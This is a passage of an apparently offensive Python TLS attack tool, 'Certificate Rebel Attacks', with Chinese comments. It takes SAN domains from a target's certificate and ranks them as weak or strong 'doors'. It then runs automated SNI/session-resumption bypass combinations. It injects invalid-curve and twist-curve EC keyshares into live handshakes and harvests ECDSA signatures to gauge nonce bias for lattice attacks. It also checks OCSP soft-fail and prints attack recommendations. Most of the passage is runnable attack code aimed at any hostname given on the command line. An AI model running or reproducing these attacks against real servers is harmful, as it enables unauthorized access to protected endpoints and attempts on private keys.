            weak_snis, strong_snis = self._classify_sni_candidates(san_domains)
            
            print(f"[*] Classified {len(weak_snis)} weak doors, {len(strong_snis)} strong doors")
            
            # 执行自动化弱门->强门组合攻击
            attack_results = await self._execute_automated_tsx_combinations(weak_snis, strong_snis)
            
            return {
                'attack_mode': 'automated',
                'san_domains_found': len(san_domains),
                'weak_doors': len(weak_snis),
                'strong_doors': len(strong_snis),
                'combinations_tested': attack_results['combinations_tested'],
                'successful_bypasses': attack_results['successful_bypasses'],
                'best_result': attack_results['best_result'],
                'success': attack_results['success']
            }
            
        except Exception as e:
            return {'skipped': f'Auto-enumeration failed: {str(e)}'}
    
    async def _extract_certificate_san_domains(self):
        """从目标证书中提取SAN域名列表"""
        import ssl
        import socket
        
        try:
            # 连接到目标并获取证书
            context = ssl.create_default_context()
            context.check_hostname = False
            context.verify_mode = ssl.CERT_NONE
            
            with socket.create_connection((self.target_host, self.tls_port), timeout=10) as sock:
                with context.wrap_socket(sock, server_hostname=self.target_host) as ssock:
                    # 获取证书信息 - 修复兼容性问题
                    cert_der = ssock.getpeercert(True)  # 获取DER格式证书
                    cert = ssl.DER_cert_to_PEM_cert(cert_der)
                    
                    # 解析证书获取SAN
                    from cryptography import x509
                    from cryptography.hazmat.primitives import serialization
                    
                    cert_obj = x509.load_pem_x509_certificate(cert.encode())
                    
                    san_domains = []
                    
                    # 提取SAN扩展
                    try:
                        san_ext = cert_obj.extensions.get_extension_for_oid(x509.ExtensionOID.SUBJECT_ALTERNATIVE_NAME)
                        for name in san_ext.value:
                            if isinstance(name, x509.DNSName):
                                domain = name.value
                                if not domain.startswith('*'):  # 跳过通配符
                                    san_domains.append(domain)
                    except x509.ExtensionNotFound:
                        pass
                    
                    # 如果没有SAN，使用CN
                    if not san_domains:
                        try:
                            subject = cert_obj.subject
                            for attribute in subject:
                                if attribute.oid == x509.NameOID.COMMON_NAME:
                                    cn = attribute.value
                                    if not cn.startswith('*'):
                                        san_domains.append(cn)
                        except:
                            pass
                    
                    # 确保目标主机在列表中
                    if self.target_host not in san_domains:
                        san_domains.insert(0, self.target_host)
                    
                    return list(set(san_domains))  # 去重
                    
        except Exception as e:
            print(f"[-] Certificate SAN extraction failed: {e}")
            # 回退到基础域名推测
            return self._generate_fallback_domains()
    
    def _generate_fallback_domains(self):
        """生成回退域名列表（当无法获取证书SAN时）"""
        base_domain = self.target_host
        
        # 去掉子域前缀
        if base_domain.count('.') > 1:
            parts = base_domain.split('.')
            root_domain = '.'.join(parts[-2:])
        else:
            root_domain = base_domain
        
        # 生成常见的子域组合
        fallback_domains = [
            base_domain,
            root_domain,
            f"www.{root_domain}",
            f"api.{root_domain}",
            f"admin.{root_domain}",
            f"management.{root_domain}",
            f"internal.{root_domain}"
        ]
        
        return list(set(fallback_domains))
    
    def _classify_sni_candidates(self, san_domains):
        """自动分类弱门vs强门SNI候选"""
        
        weak_sni_patterns = [
            '',  # 裸域
            'www.',
            'cdn.',
            'static.',
            'assets.',
            'img.',
            'js.',
            'css.'
        ]
        
        strong_sni_patterns = [
            'admin.',
            'api.',
            'management.',
            'internal.',
            'private.',
            'secure.',
            'auth.',
            'login.',
            'panel.',
            'dashboard.',
            'control.',
            'mgmt.',
            'backend.',
            'intranet.'
        ]
        
        weak_snis = []
        strong_snis = []
        
        for domain in san_domains:
            domain_lower = domain.lower()
            
            # 检查是否匹配强门模式
            is_strong = any(pattern in domain_lower for pattern in strong_sni_patterns)
            
            # 检查是否匹配弱门模式
            is_weak = any(domain_lower.startswith(pattern) for pattern in weak_sni_patterns)
            
            if is_strong:
                strong_snis.append(domain)
            elif is_weak or domain == self.target_host:
                weak_snis.append(domain)
            else:
                # 默认情况：如果包含数字或短子域，可能是弱门
                if any(char.isdigit() for char in domain) or len(domain.split('.')[0]) <= 3:
                    weak_snis.append(domain)
                else:
                    strong_snis.append(domain)
        
        # 确保至少有一个弱门和强门
        if not weak_snis and san_domains:
            weak_snis = [san_domains[0]]
        
        if not strong_snis:
            # 生成一些常见的强门候选
            base_domain = '.'.join(self.target_host.split('.')[-2:]) if '.' in self.target_host else self.target_host
            strong_snis = [f"admin.{base_domain}", f"api.{base_domain}"]
        
        return weak_snis, strong_snis
    
    async def _execute_automated_tsx_combinations(self, weak_snis, strong_snis):
        """执行自动化的弱门->强门组合攻击"""
        
        combinations_tested = 0
        successful_bypasses = []
        best_result = None
        
        # 限制组合数量，避免过度测试（减少数量以防止超时）
        max_combinations = 6  # 从20减少到6
        tested_combinations = 0
        
        for weak_sni in weak_snis[:3]:  # 最多测试3个弱门（从5减少）
            for strong_sni in strong_snis[:2]:  # 最多测试2个强门（从4减少）
                if tested_combinations >= max_combinations:
                    break
                    
                if weak_sni == strong_sni:
                    continue  # 跳过相同的SNI
                
                tested_combinations += 1
                combinations_tested += 1
                
                progress = f"{tested_combinations}/{max_combinations}"
                logger.info("TSX progress %s: %s -> %s", progress, weak_sni, strong_sni)
                
                try:
                    # 执行TSX攻击
                    success, message = await self.tsx_attack.run_tsx_attack(weak_sni, strong_sni)
                    
                    result = {
                        'weak_sni': weak_sni,
                        'strong_sni': strong_sni,
                        'success': success,
                        'message': message,
                        'combination_id': combinations_tested
                    }
                    
                    if success:
                        successful_bypasses.append(result)
                        if not best_result or 'bypass detected' in str(message).lower():
                            best_result = result
                        print(f"[+] TSX bypass successful: {weak_sni} -> {strong_sni}")
                    else:
                        # 处理结构化错误响应
                        if isinstance(message, dict):
                            error_class = message.get('error_classification', 'Unknown')
                            confidence = message.get('confidence', 'Unknown')
                            conclusion = message.get('conclusion', 'No conclusion')
                            evidence = message.get('evidence', 'No evidence')
                            
                            print(f"[-] TSX combination failed: {weak_sni} -> {strong_sni}")
                            print(f"    Error Type: {error_class} ({confidence})")
                            print(f"    Conclusion: {conclusion}")
                            print(f"    Evidence: {evidence[:100]}...")  # 限制长度
                        else:
                            print(f"[-] TSX combination failed: {message}")
                    
                    # 短暂延迟避免过快请求
                    await asyncio.sleep(0.5)
                    
                except Exception as e:
                    print(f"[-] TSX combination error: {e}")
                    continue
            
            if tested_combinations >= max_combinations:
                break
        
        return {
            'combinations_tested': combinations_tested,
            'successful_bypasses': successful_bypasses,
            'best_result': best_result,
            'success': len(successful_bypasses) > 0
        }
    
    async def test_certificate_chain_bypass(self):
        """Chain-validation check (noise-free).
        Note: From a generic client we cannot assert whether the server would accept a broken CLIENT certificate chain.
        We only validate the SERVER certificate path using the system trust store to avoid false positives."""
        try:
            return {
                'status': 'Skipped',
                'classification': 'informational',
                'evidence': 'Client-side cannot validate server-side certificate-chain acceptance; requires server policy access.',
                'vulnerability': False
            }
        except Exception as e:
            return {
                'status': 'Error',
                'classification': 'informational',
                'evidence': f'Check failed: {e}',
                'vulnerability': False
            }
    
    async def _test_handshake_with_chain(self, chain_type):
        """使用指定类型的证书链测试握手（修正后的无噪声实现）"""
        start_time = time.perf_counter()
        
        try:
            if chain_type in ("validated", "normal"):
                # 正常握手并验证服务器证书（使用系统信任根）
                ctx = ssl.create_default_context()
                ctx.check_hostname = True
                ctx.verify_mode = ssl.CERT_REQUIRED
                
                sock = socket.create_connection((self.target_host, self.tls_port), self.timeout)
                ssock = ctx.wrap_socket(sock, server_hostname=self.target_host)
                
                # 成功建立连接并完成验证
                handshake_time = (time.perf_counter() - start_time) * 1000
                try:
                    proto = ssock.version()
                except Exception:
                    proto = None
                try:
                    cipher_info = ssock.cipher()
                    cipher_name = cipher_info[0] if isinstance(cipher_info, (list, tuple)) and cipher_info else None
                except Exception:
                    cipher_name = None
                ssock.close()
                
                return {
                    'handshake_success': True,
                    'handshake_time': handshake_time,
                    'protocol': proto,
                    'cipher': cipher_name,
                    'error': None
                }
                
            elif chain_type == "insecure":
                # 不验证（仅用于诊断，不参与安全判断）
                ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
                ctx.check_hostname = False
                ctx.verify_mode = ssl.CERT_NONE
                
                sock = socket.create_connection((self.target_host, self.tls_port), self.timeout)
                ssock = ctx.wrap_socket(sock, server_hostname=self.target_host)
                
                handshake_time = (time.perf_counter() - start_time) * 1000
                try:
                    proto = ssock.version()
                except Exception:
                    proto = None
                try:
                    cipher_info = ssock.cipher()
                    cipher_name = cipher_info[0] if isinstance(cipher_info, (list, tuple)) and cipher_info else None
                except Exception:
                    cipher_name = None
                ssock.close()
                
                return {
                    'handshake_success': True,
                    'handshake_time': handshake_time,
                    'protocol': proto,
                    'cipher': cipher_name,
                    'error': None
                }
        except Exception as e:
            handshake_time = (time.perf_counter() - start_time) * 1000
            return {
                'handshake_success': False,
                'handshake_time': handshake_time,
                'error': str(e)
            }
    
    async def run_ec_certificate_attacks(self):
        """运行EC椭圆曲线证书攻击 - 集成p256_elliptic模块"""
        logger.info("Starting EC elliptic curve certificate attacks...")
        
        ec_results = {
            'attacks_performed': [],
            'vulnerabilities_found': [],
            'total_tests': 0,
            'critical_findings': []
        }
        
        if not P256_MODULE_AVAILABLE:
            logger.warning("P-256 module not available, skipping advanced EC attacks")
            ec_results['error'] = 'P-256 module not available'
            return ec_results
        
        if not self.ec_probe_factory:
            logger.warning("EC probe factory not initialized")
            ec_results['error'] = 'EC probe factory not initialized'
            return ec_results
        
        try:
            # 1. 测试非法曲线点攻击
            logger.info("Testing invalid curve point attacks...")
            invalid_points = self.ec_probe_factory.generate_invalid_curve_point()
            
            for i, point in enumerate(invalid_points[:3]):  # 测试前3个点
                logger.debug("Testing invalid point %s/%s", i+1, min(3, len(invalid_points)))
                ec_results['attacks_performed'].append('invalid_curve_point')
                ec_results['total_tests'] += 1
                
                # 本地数学验证 + 可插拔TLS注入尝试（仅在提供注入器时）
                if hasattr(point, 'x') and hasattr(point, 'y') and point.x and point.y:
                    on_curve = self._is_point_on_curve(point)
                    record = {
                        'type': 'invalid_curve_point',
                        'point': f"({hex(point.x)[:16]}..., {hex(point.y)[:16]}...)",
                        'on_curve': bool(on_curve),
                        'local_ecdh': {'attempted': False},
                    }
                    if self.keyshare_injector is not None and not on_curve:
                        try:
                            accepted, evidence = await asyncio.to_thread(
                                self.keyshare_injector.try_tls_keyshare,
                                self.target_host, self.tls_port, int(point.x), int(point.y), self.timeout
                            )
                            record['tls_injection'] = {'accepted': accepted, 'evidence': evidence}
                            if accepted:
                                classification = 'confirmed' if 'selected_group=secp256r1' in str(evidence).lower() else 'potential'
                                ec_results['vulnerabilities_found'].append({
                                    'type': 'invalid_curve_point_tls',
                                    'severity': 'CRITICAL' if classification == 'confirmed' else 'HIGH',
                                    'classification': classification,
                                    'description': 'Server accepted invalid EC keyshare',
                                    'evidence': evidence
                                })
                                logger.log(logging.CRITICAL if classification == 'confirmed' else logging.WARNING,
                                           "Invalid EC keyshare accepted (%s): %s", classification, evidence)
                        except Exception as e:
                            record['tls_injection'] = {'accepted': False, 'evidence': f'Injector error: {e}'}
                    ec_results.setdefault('evidence_records', []).append(record)
            
            # 2. 扭曲曲线攻击：改为真实 TLS KeyShare 注入（不再本地记录）
            logger.info("Testing twist curve attacks via TLS KeyShare injection...")
            try:
                attack_results = run_ec_attacks(host=self.target_host, port=self.target_port, attack_types=["twist"], timeout=self.timeout)
                for ar in attack_results:
                    ec_results['attacks_performed'].append('twist_curve_tls')
                    ec_results['total_tests'] += 1
                    if ar.get('success'):
                        ec_results['vulnerabilities_found'].append({
                            'type': 'twist_curve_tls',
                            'severity': 'CRITICAL',
                            'evidence': ar.get('evidence')
                        })
                        logger.info("Twist attack confirmed via TLS injection")
                    else:
                        ec_results.setdefault('evidence_records', []).append({'type': 'twist_curve_tls', 'evidence': ar.get('evidence')})
            except Exception as e:
                logger.warning(f"Twist TLS injection error: {str(e)[:100]}")
            
            # 3. 测试小子群限制攻击
            logger.info("Testing small subgroup confinement attacks...")
            small_order_points = self.ec_probe_factory.generate_small_order_points(max_order=10)
            
            for point in small_order_points[:3]:  # 测试前3个小阶点
                if point.order:
                    logger.debug("Testing small order point (order=%s)", point.order)
                    ec_results['attacks_performed'].append('small_subgroup')
                    ec_results['total_tests'] += 1
                    
                    if point.order < 10:
                        logger.info("Small order point generated: order %s", point.order)
            
            # 4. 测试ECDSA nonce偏差
            logger.info("Testing ECDSA nonce bias...")
            try:
                # CORRECT: Instantiate the P256 framework and call the REAL signature collector
                attack_framework = P256AttackFramework(self.target_host, self.tls_port)
                signatures_to_analyze = await attack_framework._collect_ecdsa_signatures(count=100)
                
                # OPTIONAL BUT RECOMMENDED: Implement Adaptive Sampling
                analysis = self.ec_probe_factory.analyze_nonce_bias(signatures_to_analyze)
                
                if analysis.get('bias_score', 0) < 2 and len(signatures_to_analyze) > 0: # 增加判断，避免无签名时也打印
                    logger.info("No significant nonce bias detected in initial sample.")
                elif analysis.get('bias_score', 0) < 5 and len(signatures_to_analyze) > 0:
                    logger.info("Weak bias signal detected, increasing sample size for confirmation...")
                    additional_signatures = await attack_framework._collect_ecdsa_signatures(count=200)
                    signatures_to_analyze.extend(additional_signatures)
                    analysis = self.ec_probe_factory.analyze_nonce_bias(signatures_to_analyze) # Re-analyze with more data
                
                # Now, proceed with the analysis using the potentially larger signature set
                if signatures_to_analyze: # 确保有签名才进行分析
                    if analysis.get('bias_detected'):
                        vuln = {
                            'type': 'ecdsa_nonce_bias',
                            'severity': 'HIGH',
                            'leaked_bits': analysis.get('estimated_leaked_bits', 0),
                            'description': 'ECDSA nonce bias pattern detected in real-world signatures',
                            'evidence': analysis.get('indicators', []),
                            'detailed_analysis': {
                                'bias_score': analysis.get('bias_score', 0),
                                'lattice_attack_feasible': analysis.get('lattice_attack_feasible', False),
                                'signatures_analyzed': len(signatures_to_analyze),
                                'full_bias_analysis': analysis,
                                'signature_samples': [ # 从真实签名中提取样本
                                    {
                                        'r': hex(int.from_bytes(sig[0], 'big')),
                                        's': hex(int.from_bytes(sig[1], 'big')),
                                        'message_hash': sig[2].hex(),
                                    } for sig in signatures_to_analyze[:10]
                                ]
                            }
                        }
                        ec_results['vulnerabilities_found'].append(vuln)
                        logger.info("Nonce bias detected - %s bits potentially leaked", analysis.get('estimated_leaked_bits', 'N/A'))
                    else:
                        logger.info("No significant nonce bias detected in real-world signatures.")
                else:
                    logger.info("Could not collect any signatures for nonce bias analysis.")
                
                ec_results['attacks_performed'].append('nonce_bias_analysis')
                ec_results['total_tests'] += 1

            except Exception as e:
                logger.warning(f"Nonce bias test error: {str(e)[:100]}")

            # 5. 测试压缩点故障注入
            logger.info("Testing compression point fault injection...")
            try:
                compression_points = self.ec_probe_factory.generate_compression_fault_points()
                
                for i, (point, compressed_data) in enumerate(compression_points[:2]):
                    logger.debug("Testing compression fault %s", i+1)
                    ec_results['attacks_performed'].append('compression_fault')
                    ec_results['total_tests'] += 1
                    
                    # 实际测试应该发送压缩点数据并观察响应
                    logger.info("Compression fault point tested")
                
            except Exception as e:
                logger.warning(f"Compression fault test error: {str(e)[:100]}")
            
            # 统计结果
            logger.info("EC Attack Summary:")
            logger.info("Total tests performed: %s", ec_results['total_tests'])
            logger.info("Attack types tested: %s", len(set(ec_results['attacks_performed'])))
            logger.info("Potential vulnerabilities: %s", len(ec_results['vulnerabilities_found']))
            
            if ec_results['vulnerabilities_found']:
                logger.warning("Potential EC vulnerabilities detected:")
                for vuln in ec_results['vulnerabilities_found'][:3]:
                    logger.warning(" - %s: %s", vuln.get('type'), vuln.get('description'))
            
        except Exception as e:
            logger.error(f"EC certificate attack error: {str(e)[:200]}")
            ec_results['error'] = str(e)
        
        return ec_results
    
    def _is_point_on_curve(self, point):
        """检查点是否在P-256曲线上"""
        if not self.ec_curve:
            return False
        
        try:
            if hasattr(point, 'x') and hasattr(point, 'y'):
                return self.ec_curve.point_on_curve(point.x, point.y)
            return False
        except:
            return False

    async def _local_ecdh_attempt(self, point: Any) -> Dict[str, Any]:
        """已废弃：不再做本地 ECDH 自测，统一由 TLS KeyShare 注入验证。"""
        return {'attempted': False}
    
    async def verify_ocsp_soft_fail(self, cert=None):
        """OCSP soft-fail check (informational only).
        From a generic client we cannot determine server-side OCSP hard/soft-fail policy.
        We only report OCSP URL presence and basic reachability to avoid false positives."""
        try:
            # Fetch server certificate if not provided
            if cert is None:
                try:
                    context = ssl.create_default_context()
                    context.check_hostname = False
                    context.verify_mode = ssl.CERT_NONE
                    with socket.create_connection((self.target_host, self.tls_port), self.timeout) as sock:
                        with context.wrap_socket(sock, server_hostname=self.target_host) as ssock:
                            cert_der = ssock.getpeercert(True)
                            if cert_der:
                                from cryptography import x509
                                cert = x509.load_der_x509_certificate(cert_der)
                            else:
                                return {'status': 'Error', 'evidence': 'Could not retrieve server certificate', 'vulnerability': False}
                except Exception as e:
                    return {'status': 'Error', 'evidence': f'Certificate retrieval failed: {e}', 'vulnerability': False}

            # Extract OCSP URL
            ocsp_url = self._extract_ocsp_url(cert) if cert else None
            if not ocsp_url:
                return {'status': 'No_OCSP', 'evidence': 'Certificate has no OCSP URL', 'vulnerability': False}

            # Check OCSP responder reachability (client-side only)
            ocsp_reachable = await self._test_ocsp_connectivity(ocsp_url)
            reach_text = 'reachable' if ocsp_reachable else 'unreachable'
            return {
                'status': 'Info',
                'classification': 'informational',
                'evidence': f'OCSP responder {reach_text} (client-side check only)',
                'ocsp_url': ocsp_url,
                'vulnerability': False
            }
        except Exception as e:
            return {'status': 'Error', 'evidence': f'OCSP check failed: {e}', 'vulnerability': False}

    def _extract_ocsp_url(self, cert):
        """从证书中提取OCSP URL"""
        try:
            from cryptography import x509
            # 获取Authority Information Access扩展
            aia_ext = cert.extensions.get_extension_for_class(x509.AuthorityInformationAccess).value
            
            for access_description in aia_ext:
                if access_description.access_method == x509.oid.AuthorityInformationAccessOID.OCSP:
                    return access_description.access_location.value
            
            return None
        except Exception:
            return None

    async def _test_ocsp_connectivity(self, ocsp_url):
        """测试OCSP服务器连通性"""
        try:
            import urllib.parse
            parsed_url = urllib.parse.urlparse(ocsp_url)
            hostname = parsed_url.hostname
            port = parsed_url.port or (443 if parsed_url.scheme == 'https' else 80)
            
            # 使用asyncio进行异步连接测试
            try:
                reader, writer = await asyncio.wait_for(
                    proxy_open_connection(PROXY_URL, hostname, port) if PROXY_ENABLED and PROXY_AVAILABLE else asyncio.open_connection(hostname, port),
                    timeout=5.0
                )
                writer.close()
                await writer.wait_closed()
                return True
            except Exception:
                return False
                
        except Exception as e:
            print(f"[*] OCSP server {ocsp_url} unreachable: {e}")
            return False

    async def _test_with_broken_ocsp(self, ocsp_url):
        """测试服务器在OCSP不可达时是否仍接受证书（软失败检测）"""
        try:
            import ssl
            
            # 创建一个修改过的SSL上下文，模拟OCSP服务器不可达
            context = ssl.create_default_context()
            context.check_hostname = False
            context.verify_mode = ssl.CERT_NONE  # 我们只测试握手是否成功
            
            # 尝试建立连接，观察在OCSP不可达时的行为
            start_time = time.perf_counter()
            
            try:
                reader, writer = await asyncio.wait_for(
                    proxy_open_connection(PROXY_URL, self.target_host, self.tls_port, ssl_context=context, server_hostname=self.target_host) if PROXY_ENABLED and PROXY_AVAILABLE else asyncio.open_connection(self.target_host, self.tls_port, ssl=context, server_hostname=self.target_host),
                    timeout=self.timeout
                )
                
                # 发送简单HTTP请求测试应用层
                http_request = f"GET / HTTP/1.1\r\nHost: {self.target_host}\r\nConnection: close\r\n\r\n"
                writer.write(http_request.encode())
                await writer.drain()
                
                response = await asyncio.wait_for(reader.read(1024), timeout=3.0)
                
                writer.close()
                await writer.wait_closed()
                
                handshake_time = (time.perf_counter() - start_time) * 1000
                
                # 如果握手成功且有HTTP响应，说明服务器可能采用软失败模式
                if len(response) > 0:
                    print(f"[*] TLS handshake successful despite potential OCSP issues (time: {handshake_time:.1f}ms)")
                    return True
                else:
                    return False
                    
            except Exception as e:
                # TLS握手失败，可能说明OCSP验证是强制的（硬失败）
                print(f"[*] TLS handshake failed when OCSP unavailable: {e}")
                return False
                
        except Exception as e:
            print(f"[*] OCSP soft-fail test error: {e}")
            return False
    
    def print_summary(self, results):
        """打印攻击结果摘要"""
        print(f"\n" + "="*60)
        print(f"CERTIFICATE REBEL ATTACK SUMMARY")
        print(f"="*60)
        print(f"Target: {results['target']}")
        print(f"Time: {results['timestamp']}")
        
        attacks = results['attacks']
        
        # TSX结果（自动化版本）
        if 'tsx' in attacks:
            tsx = attacks['tsx']
            if tsx.get('success'):
                if tsx.get('attack_mode') == 'automated':
                    print(f"[CRITICAL] TSX Automated Bypass: SUCCESS")
                    print(f"       Tested {tsx.get('combinations_tested', 0)} combinations")
                    print(f"       Found {len(tsx.get('successful_bypasses', []))} successful bypasses")
                    if tsx.get('best_result'):
                        best = tsx['best_result']
                        print(f"       Best: {best['weak_sni']} -> {best['strong_sni']}")
                else:
                    print(f"[CRITICAL] TSX Session Resume Bypass: SUCCESS")
                    print(f"       {tsx.get('message', 'Manual attack successful')}")
            elif tsx.get('skipped'):
                print(f"[INFO] TSX Attack: SKIPPED ({tsx['skipped']})")
            else:
                print(f"[OK] TSX Attack: FAILED")
        
        # mTLS信任泄漏结果
        if 'mtls_leak' in attacks:
            mtls = attacks['mtls_leak']
            if mtls['vulnerable_headers'] > 0:
                print(f"[HIGH] mTLS Trust Leakage: {mtls['vulnerable_headers']} vulnerabilities")
                for detail in mtls['header_details']:
                    print(f"       {detail['header']}: {detail['evidence']}")
            else:
                print(f"[OK] mTLS Trust Leakage: No vulnerabilities found")
            
            if mtls['proxy_detected']:
                print(f"[INFO] Proxy Detected: {mtls['proxy_confidence']:.1%} confidence")
        
        # HTTP代理证书穿透结果
        if 'proxy_cert_bypass' in attacks:
            bypass = attacks['proxy_cert_bypass']
            if bypass['critical_bypasses'] > 0:
                print(f"[CRITICAL] HTTP Proxy Cert Bypass: {bypass['critical_bypasses']} critical vulnerabilities")
                for detail in bypass['bypass_details']:
                    print(f"       {detail['path']} via {detail['header']}: {detail['evidence']}")
            else:
                print(f"[OK] HTTP Proxy Cert Bypass: No critical vulnerabilities found")
        
        # CDN证书链分析结果
        if 'cdn_cert_analysis' in attacks:
            cdn = attacks['cdn_cert_analysis']
            if cdn.get('skipped'):
                print(f"[INFO] CDN Certificate Analysis: SKIPPED ({cdn['skipped']})")
            else:
                total_issues = cdn['mismatches'] + cdn['vulnerabilities'] + cdn['routing_issues']
                if total_issues > 0:
                    print(f"[HIGH] CDN Certificate Issues: {total_issues} configuration problems")
                    if cdn['mismatches'] > 0:
                        print(f"       Certificate Mismatches: {cdn['mismatches']}")
                    if cdn['vulnerabilities'] > 0:
                        print(f"       Certificate Vulnerabilities: {cdn['vulnerabilities']}")
                    if cdn['routing_issues'] > 0:
                        print(f"       SNI Routing Issues: {cdn['routing_issues']}")
                else:
                    print(f"[OK] CDN Certificate Analysis: No issues detected")
        
        # 证书链时序分析结果
        if 'cert_timing_analysis' in attacks:
            timing = attacks['cert_timing_analysis']
            if timing.get('error'):
                print(f"[ERROR] Certificate Timing Analysis: {timing['error']}")
            else:
                if timing['bypasses_count'] > 0:
                    print(f"[HIGH] Certificate Timing Bypasses: {timing['bypasses_count']} potential bypasses")
                    for bypass in timing['critical_bypasses']:
                        print(f"       {bypass['type']}: {bypass['risk']}")
                elif timing['insights_count'] > 0:
                    print(f"[MEDIUM] Certificate Timing Insights: {timing['insights_count']} validation patterns")
                    for insight in timing['key_insights']:
                        print(f"       {insight['type']}: {insight['finding']}")
                else:
                    print(f"[OK] Certificate Timing Analysis: No significant patterns detected")
        
        # 证书链短路测试结果
        if 'cert_chain_bypass' in attacks:
            chain_test = attacks['cert_chain_bypass']
            if chain_test.get('error'):
                print(f"[ERROR] Certificate Chain Bypass Test: {chain_test['error']}")
            else:
                status = chain_test.get('status', 'Unknown')
                if status == 'Vulnerable':
                    print(f"[CRITICAL] Certificate Chain Bypass: VULNERABLE")
                    print(f"       Impact: {chain_test.get('impact', 'Unknown impact')}")
                    print(f"       Evidence: {chain_test.get('evidence', 'No evidence')}")
                elif status == 'Secure':
                    print(f"[OK] Certificate Chain Validation: SECURE")
                    print(f"       Evidence: {chain_test.get('evidence', 'No evidence')}")
                else:
                    print(f"[INFO] Certificate Chain Test: {status}")
                    print(f"       Details: {chain_test.get('evidence', 'No details')}")
        
        # nginx证书漏洞扫描结果
        if 'nginx_cert_vulns' in attacks:
            nginx = attacks['nginx_cert_vulns']
            if nginx.get('error'):
                print(f"[ERROR] nginx Certificate Scan: {nginx['error']}")
            else:
                if nginx['nginx_version']:
                    print(f"[INFO] Detected nginx: {nginx['nginx_version']}")
                
                if nginx['high_severity_count'] > 0:
                    print(f"[CRITICAL] nginx High-Severity Vulnerabilities: {nginx['high_severity_count']} critical issues")
                    for vuln in nginx['critical_findings']:
                        cve = vuln.get('cve', 'N/A')
                        print(f"       {cve}: {vuln['description']}")
                elif nginx['total_vulnerabilities'] > 0:
                    print(f"[MEDIUM] nginx Certificate Vulnerabilities: {nginx['total_vulnerabilities']} issues")
                
                if len(nginx['ssl_variable_leaks']) > 0:
                    print(f"[HIGH] nginx SSL Variable Leaks: {len(nginx['ssl_variable_leaks'])} variables exposed")
                    for leak in nginx['ssl_variable_leaks']:
                        print(f"       {leak['variable']}: {leak['evidence']}")
                
                if nginx['total_misconfigurations'] > 0:
                    print(f"[MEDIUM] nginx SSL Misconfigurations: {nginx['total_misconfigurations']} config issues")
                
                if (nginx['total_vulnerabilities'] == 0 and nginx['total_misconfigurations'] == 0 
                    and nginx['total_ssl_issues'] == 0):
                    print(f"[OK] nginx Certificate Security: No issues detected")
        
        # 架构分析结果
        if 'architecture_analysis' in attacks:
            arch_result = attacks['architecture_analysis']
            if arch_result.get('error'):
                print(f"[ERROR] Architecture Analysis: {arch_result['error']}")
            else:
                arch_type = arch_result.get('architecture_type', 'Unknown')
                confidence = arch_result.get('confidence', 0)
                wasm_detected = arch_result.get('wasm_detected', False)
                if wasm_detected:
                    print(f"[INFO] Wasm Runtime Detected: {arch_type} (confidence: {confidence:.2f})")
                else:
                    print(f"[OK] Traditional Architecture: {arch_type} - No Wasm detected")
                
                # 显示Wasm分析详情（如果有）
                raw_analysis = arch_result.get('raw_analysis', {})
                if raw_analysis.get('risk_level'):
                    print(f"       Security Score: {raw_analysis.get('security_score', 'N/A')}/100")
                    print(f"       Risk Level: {raw_analysis.get('risk_level', 'Unknown')}")
                
                # 显示攻击建议
                recommendations = arch_result.get('attack_recommendations', [])
                if recommendations:
                    print(f"       Attack Recommendations:")
                    for rec in recommendations[:2]:  # 显示前2个建议
                        print(f"         - {rec}")
        
        # Wasm运行时分析结果
        if 'wasm_analysis' in attacks:
            wasm_result = attacks['wasm_analysis']
            if wasm_result.get('error'):
                print(f"[ERROR] Wasm Runtime Analysis: {wasm_result['error']}")
            else:
                if wasm_result.get('wasm_detected', False):
                    runtime_type = wasm_result.get('runtime_type', 'Unknown')
                    confidence = wasm_result.get('confidence', 0)
                    
                    print(f"[HIGH] Wasm Runtime Detected: {runtime_type} (confidence: {confidence:.2f})")
                    
                    # 显示检测到的特征
                    features = wasm_result.get('wasm_features', [])
                    if features:
                        print(f"       Detected Features:")
                        for feature in features[:2]:  # 显示前2个特征
                            print(f"         - {feature}")
                    
                    # 显示攻击面
                    attack_surface = wasm_result.get('attack_surface', [])
                    if attack_surface:
                        print(f"       Attack Surface:")
                        for surface in attack_surface[:2]:  # 显示前2个攻击面
                            print(f"         - {surface}")
                else:
                    runtime_type = wasm_result.get('runtime_type', 'Traditional_Runtime')
                    print(f"[OK] Traditional Architecture: {runtime_type} - No Wasm detected")
        
        # EC椭圆曲线证书攻击结果
        if 'ec_certificate' in attacks:
            ec_result = attacks['ec_certificate']
            if ec_result.get('error'):
                print(f"[ERROR] EC Certificate Attack: {ec_result['error']}")
            else:
                total_vulns = len(ec_result.get('vulnerabilities_found', []))
                critical_vulns = len(ec_result.get('critical_findings', []))
                
                if total_vulns > 0 or critical_vulns > 0:
                    severity = 'CRITICAL' if critical_vulns > 0 else 'HIGH'
                    print(f"[{severity}] EC Certificate Vulnerabilities: {total_vulns + critical_vulns} issues found")
                    print(f"       Tests performed: {ec_result.get('total_tests', 0)}")
                    print(f"       Attack types: {', '.join(set(ec_result.get('attacks_performed', [])))}")
                    
                    # 显示关键漏洞
                    for vuln in ec_result.get('vulnerabilities_found', [])[:2]:
                        print(f"       - {vuln['type']}: {vuln['description']}")
                    for vuln in ec_result.get('critical_findings', [])[:2]:
                        print(f"       - [CRITICAL] {vuln['type']}: {vuln['description']}")
                else:
                    print(f"[OK] EC Certificate Security: No vulnerabilities detected")
                    print(f"       Tests performed: {ec_result.get('total_tests', 0)}")
        
        # OCSP软失败验证结果
        if 'ocsp_soft_fail' in attacks:
            ocsp_result = attacks['ocsp_soft_fail']
            if ocsp_result.get('error'):
                print(f"[ERROR] OCSP Soft-Fail Verification: {ocsp_result['error']}")
            else:
                if ocsp_result.get('vulnerable', False):
                    severity = ocsp_result.get('severity', 'Unknown')
                    status = ocsp_result.get('status', 'Unknown')
                    
                    print(f"[{severity}] OCSP Soft-Fail Vulnerability: {ocsp_result.get('impact', 'OCSP validation weakness detected')}")
                    print(f"       Status: {status}")
                    print(f"       OCSP URL: {ocsp_result.get('ocsp_url', 'Unknown')}")
                    
                    # 显示高级发现
                    findings = ocsp_result.get('advanced_findings', [])
                    if findings:
                        print(f"       Key Findings:")
                        for finding in findings[:3]:  # 显示前3个发现
                            print(f"         - {finding}")
                else:
                    status = ocsp_result.get('status', 'Unknown')
                    print(f"[OK] OCSP Validation Security: {ocsp_result.get('impact', 'Validation appears secure')}")
                    if status != 'No_OCSP':
                        print(f"       Status: {status}")
        
        print(f"="*60)

# CLI接口
async def main():
    import argparse
    
    parser = argparse.ArgumentParser(description='Certificate Rebel Attacks')
    parser.add_argument('host', help='Target hostname')
    parser.add_argument('--port', type=int, default=443, help='Target port')
